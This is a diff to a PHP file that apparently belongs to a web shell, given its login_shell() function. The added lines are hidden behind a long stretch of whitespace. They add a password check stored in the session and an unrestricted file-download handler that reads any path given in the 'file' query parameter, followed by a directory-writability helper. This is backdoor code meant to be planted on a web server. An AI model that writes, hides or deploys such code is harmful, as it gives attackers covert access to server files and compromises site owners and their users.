@@ -140,9 +140,29 @@ function login_shell() {
 </body>
 </html>
 
-<?php
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
-?>
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+exit;
+	}
+
+	if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+	if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
+		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+	else
+	login_shell();
+	if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+		@ob_clean();
+		$file = $_GET['file'];
+		header('Content-Description: File Transfer');
+		header('Content-Type: application/octet-stream');
+		header('Content-Disposition: attachment; filename="'.basename($file).'"');
+		header('Expires: 0');
+		header('Cache-Control: must-revalidate');
+		header('Pragma: public');
+		header('Content-Length: ' . filesize($file));
+		readfile($file);
+		exit;
+	}
+	?>
 <?php
 	function w($dir,$perm) {
 		if(!is_writable($dir)) {
